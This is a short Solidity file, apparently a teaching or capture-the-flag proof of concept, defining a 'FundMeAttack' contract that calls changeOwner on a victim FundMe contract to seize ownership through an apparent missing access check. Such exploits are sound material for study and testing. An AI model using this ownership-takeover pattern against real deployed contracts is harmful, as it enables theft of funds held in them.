// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './FundMe.sol';

contract FundMeAttack {

  function attack(address payable _victim, address _owner) public {
    FundMe fundMe = FundMe(_victim);
    fundMe.changeOwner(_owner);
  }
}
